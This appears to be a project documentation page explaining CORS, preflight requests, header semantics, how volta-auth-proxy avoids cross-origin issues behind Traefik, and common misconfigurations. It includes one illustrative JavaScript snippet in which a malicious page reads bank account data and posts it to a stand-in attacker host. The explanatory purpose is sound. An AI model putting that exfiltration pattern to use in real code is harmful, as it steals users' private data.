# CORS (Cross-Origin Resource Sharing)

## What is it?

Cross-Origin Resource Sharing (CORS) is a security mechanism built into web browsers that controls whether a web page from one domain (origin) is allowed to make requests to a different domain. An "origin" is the combination of protocol, domain, and port -- so `https://app.example.com` and `https://api.example.com` are different origins, even though they share the same base domain.

By default, browsers enforce the **same-origin policy**: JavaScript on a page can only make requests to the same origin that served the page. CORS is the way servers opt in to allowing requests from other origins.

For example:

```
  https://app.example.com           https://api.example.com
  +---------------------+          +---------------------+
  |  Frontend (React)   |          |  Backend API        |
  |                     |          |                     |
  |  fetch('/api/data') |--BLOCKED->  Without CORS,      |
  |                     |          |  browser refuses     |
  |  fetch('/api/data') |--OK----->  With CORS headers,  |
  |                     |          |  browser allows      |
  +---------------------+          +---------------------+
```

The key thing to understand: CORS is enforced by the **browser**, not the server. The server just sends headers saying what is allowed. The browser reads those headers and decides whether to let the JavaScript code see the response.

## Why does it matter?

Without the same-origin policy, any website you visit could make requests to your bank, your email, or any other site where you are logged in -- and read the responses. Your cookies would be sent automatically, so the request would be authenticated.

Imagine this scenario without same-origin policy:

```
  You visit evil-site.com while logged into your-bank.com

  evil-site.com's JavaScript:
    fetch('https://your-bank.com/api/accounts')
      .then(r => r.json())
      .then(data => {
        // Attacker now has your bank account details
        fetch('https://evil.com/steal', {body: JSON.stringify(data)})
      })
```

The same-origin policy prevents this. The browser sees that `evil-site.com` is trying to read a response from `your-bank.com` and blocks it.

CORS exists as a controlled way to relax this restriction when you genuinely need cross-origin communication -- for example, when your frontend is on `app.example.com` and your API is on `api.example.com`.

## How does it work?

### Simple requests

For simple requests (GET, HEAD, or POST with standard content types), the browser just adds an `Origin` header and sends the request. The server responds with CORS headers:

```
  Browser                               Server
  |                                      |
  |  GET /api/data                       |
  |  Origin: https://app.example.com     |
  |  Cookie: session=abc                 |
  |------------------------------------->|
  |                                      |
  |  200 OK                              |
  |  Access-Control-Allow-Origin:        |
  |    https://app.example.com           |
  |<-------------------------------------|
  |                                      |
  Browser: Origin matches? Let JS see the response.
```

### Preflight requests

For more complex requests (like PUT, DELETE, or requests with custom headers like `Authorization`), the browser first sends an OPTIONS request called a "preflight" to ask the server what is allowed:

```
  Browser                               Server
  |                                      |
  |  OPTIONS /api/data          (preflight)
  |  Origin: https://app.example.com     |
  |  Access-Control-Request-Method: DELETE
  |  Access-Control-Request-Headers:     |
  |    Authorization                     |
  |------------------------------------->|
  |                                      |
  |  204 No Content                      |
  |  Access-Control-Allow-Origin:        |
  |    https://app.example.com           |
  |  Access-Control-Allow-Methods:       |
  |    GET, POST, DELETE                 |
  |  Access-Control-Allow-Headers:       |
  |    Authorization, Content-Type       |
  |  Access-Control-Max-Age: 3600        |
  |<-------------------------------------|
  |                                      |
  Browser: Preflight OK, now send the real request.
  |                                      |
  |  DELETE /api/data                    |
  |  Origin: https://app.example.com     |
  |  Authorization: Bearer token123      |
  |------------------------------------->|
  |                                      |
  |  200 OK                              |
  |  Access-Control-Allow-Origin:        |
  |    https://app.example.com           |
  |<-------------------------------------|
```

### Key CORS headers

| Header | Sent by | Purpose |
|--------|---------|---------|
| `Origin` | Browser | Tells the server where the request comes from |
| `Access-Control-Allow-Origin` | Server | Which origins are allowed (or `*` for any) |
| `Access-Control-Allow-Methods` | Server | Which HTTP methods are allowed |
| `Access-Control-Allow-Headers` | Server | Which custom headers are allowed |
| `Access-Control-Allow-Credentials` | Server | Whether cookies/auth headers are allowed |
| `Access-Control-Max-Age` | Server | How long to cache the preflight result |

## How does volta-auth-proxy use it?

volta-auth-proxy operates primarily as a ForwardAuth endpoint behind a reverse proxy like Traefik. In this architecture, CORS considerations are specific:

**The ForwardAuth pattern avoids most CORS issues.** Because Traefik sits in front of both volta and the downstream applications, requests from the browser go to a single origin (the Traefik domain). The authentication check (`/auth/verify`) happens server-to-server between Traefik and volta, so the browser never makes a direct cross-origin request to volta.

```
  Browser                 Traefik               volta-auth-proxy
  +--------+             +---------+            +----------------+
  |        |  Request to |         | /auth/verify               |
  |        | app.example |         |----------->|               |
  |        |------------>|         |<-----------|               |
  |        |             |         | 200 + X-Volta headers      |
  |        |<------------|         |            |               |
  |        |  Response   | Proxies |            |               |
  +--------+  from app   | to app  |            +----------------+
                         +---------+

  No cross-origin request from the browser's perspective.
  Everything goes through Traefik on the same origin.
```

**API endpoints.** When volta's `/api/v1/*` endpoints are accessed directly (for example, by a single-page application making AJAX calls), CORS headers may be needed. volta's allowed redirect domains configuration (`ALLOWED_REDIRECT_DOMAINS`) controls which domains are trusted.

**The `/auth/refresh` endpoint.** The volta-sdk-js (browser SDK) calls this endpoint to refresh JWTs. If the SDK runs on a different origin than volta, CORS must be configured to allow credentials (cookies) from that origin.

volta's approach is to keep everything same-origin when possible (through the reverse proxy), and to explicitly validate origins against the allowed domain list when cross-origin is unavoidable.

## Common mistakes

**1. Setting `Access-Control-Allow-Origin: *` with credentials.**
The wildcard `*` means "any origin can access this." But browsers refuse to send cookies with wildcard CORS. If you need cookies (like volta's session cookie), you must specify the exact origin. Using `*` with `Access-Control-Allow-Credentials: true` is explicitly forbidden by the spec.

**2. Reflecting the `Origin` header back without validation.**
Some developers dynamically set `Access-Control-Allow-Origin` to whatever `Origin` the request sends. This is effectively the same as `*` but worse, because it works with credentials. Always validate the origin against a whitelist.

**3. Forgetting about preflight requests.**
If your server doesn't handle OPTIONS requests, preflight requests will fail and the browser will block the actual request. Many developers only test with simple GET requests and miss this.

**4. Thinking CORS is server-side security.**
CORS is a browser-enforced policy. A curl command, a mobile app, or another server can ignore CORS entirely. CORS protects users' browsers from being used as attack vectors. It does not replace server-side authentication and authorization.

**5. Overly broad allowed origins.**
Allowing `https://*.example.com` sounds convenient, but if any subdomain is compromised or runs user-generated content, it can make authenticated requests to your API.

**6. Not setting `Access-Control-Max-Age`.**
Without caching, the browser sends a preflight OPTIONS request before every real request. This doubles the number of HTTP requests. Set a reasonable max-age (like 3600 seconds) to cache preflight results.
